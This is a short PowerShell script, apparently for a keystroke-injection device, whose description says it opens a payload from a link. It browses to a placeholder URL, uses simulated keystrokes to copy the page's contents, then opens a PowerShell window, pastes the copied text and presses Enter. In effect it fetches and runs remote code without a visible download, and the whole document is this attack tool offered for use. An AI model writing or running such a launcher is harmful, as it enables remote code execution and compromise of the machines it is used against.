.DESCRIPTION 
	This program is designed to open payload from the link.

# Enter your link to the script ↓

# $link = "https://link.payload.example"

Add-Type -AssemblyName System.Windows.Forms
$o=New-Object -ComObject WScript.Shell
$url = -join($link)
Start-Process "$url" 
Start-Sleep -Seconds 5
[System.Windows.Forms.SendKeys]::SendWait('{TAB}'*2)
[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
Start-Sleep -Seconds 3
[System.Windows.Forms.SendKeys]::SendWait("^{a}")
Start-Sleep -Seconds 1
[System.Windows.Forms.SendKeys]::SendWait("^{c}") 
Start-Sleep -Seconds 1
[System.Windows.Forms.SendKeys]::SendWait('%{F4}')
Start-Process "powershell" 
Start-Sleep -Seconds 2
[System.Windows.Forms.SendKeys]::SendWait("^{v}") 
Start-Sleep -Seconds 5
[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
